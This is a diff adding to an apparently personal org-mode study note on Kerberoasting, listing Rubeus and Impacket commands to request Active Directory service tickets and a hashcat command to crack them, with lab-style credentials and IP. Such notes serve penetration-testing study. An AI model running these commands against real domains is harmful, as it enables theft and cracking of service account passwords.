@@ -2,7 +2,25 @@
 :ID:       78221ca4-7b41-4377-aa13-88d50a4fd30d
 :END:
 #+title: Kerberoasting
+#+filetags: :activeDirectory:kerberos:
 #+hugo_base_dir:../
 
 
-*
+* Kerberoasting
+Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.
+
+** Rubeus
+#+begin_src shell -n
+Rubeus.exe kerberoast
+#+end_src
+Then crack the hashes with hashcat
+
+#+begin_src shell -n :exports
+hashcat -m 13100 -a 0 hash.txt Pass.txt
+#+end_src
+
+
+** Impacket
+#+begin_src shell -n
+sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.239.179 -request
+#+end_src
